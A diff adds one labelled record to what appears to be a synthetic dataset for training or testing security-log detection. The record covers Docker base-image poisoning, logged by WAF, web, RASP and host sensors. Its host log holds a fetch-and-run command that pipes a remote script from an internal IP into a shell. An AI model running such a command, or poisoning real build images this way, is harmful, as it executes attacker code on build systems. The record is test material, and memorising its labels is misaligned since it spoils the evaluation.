@@ -1,0 +1,49 @@
+{
+ "unit": 1124,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Docker 基础镜像投毒（恶意 ENTRYPOINT 在流水线构建期触发）",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-12 17:00:35",
+   "source": "waf",
+   "log_id": "WAF0484573",
+   "content": "/v2/ops-corp/runner-base PUT layer sha256:9f2c41ab entrypoint=/bin/sh -c Mozilla/5.0 (Windows NT 11.0; Win64; ",
+   "event_id": "1124-WAF0484573"
+  },
+  {
+   "timestamp": "2026-07-12 17:00:37",
+   "source": "web",
+   "log_id": "WEB0487725",
+   "content": "/v2/ops-corp/runner-base PUT layer sha256:9f2c41ab entrypoint=/bin/sh -c Mozilla/5.0 (Windows NT 11.0; Win64; ",
+   "event_id": "1124-WEB0487725"
+  },
+  {
+   "timestamp": "2026-07-12 17:00:38",
+   "source": "rasp",
+   "log_id": "RASP0536145",
+   "content": "https://app-go-63.ops-corp.com/v2/ops-corp/runner-base {\"image\": \"runner-base:1.4.0\", \"entrypoint\": \"/bin/sh\"}",
+   "event_id": "1124-RASP0536145"
+  },
+  {
+   "timestamp": "2026-07-12 17:01:36",
+   "source": "hids",
+   "log_id": "HID0525147",
+   "content": "curl -s 10.20.7.31/e.sh|sh /bin/sh curl -s 10.20.7.31/e.sh|sh <== /bin/sh -c 'entry.sh' <== runc:[2:INIT]",
+   "event_id": "1124-HID0525147"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
